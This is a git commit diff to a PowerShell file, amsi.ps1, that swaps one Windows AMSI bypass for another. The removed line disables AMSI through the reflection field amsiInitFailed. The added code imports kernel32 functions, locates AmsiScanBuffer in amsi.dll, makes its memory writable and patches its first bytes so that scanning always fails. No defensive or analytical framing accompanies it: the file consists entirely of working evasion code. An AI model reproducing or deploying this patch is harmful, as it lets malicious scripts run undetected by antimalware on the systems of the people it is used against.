ca2a7b684e84c1d0c1e2dab73ddee68dc11c4ada
project:northern-lights <nathan.ingram.nl2010@gmail.com>
2025-12-05 20:27:52 +0200

    Update amsi.ps1

--- amsi.ps1
+++ amsi.ps1
@@ -1,1 +1,17 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$MethodDefinition = @'
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+'@
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
+
+$handle = $Kernel32::GetModuleHandle("amsi.dll")
+$address = $Kernel32::GetProcAddress($handle, "AmsiScanBuffer")
+$oldProtection = 0
+$Kernel32::VirtualProtect($address, [uint32]5, 0x40, [ref]$oldProtection)
+$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $address, 6)
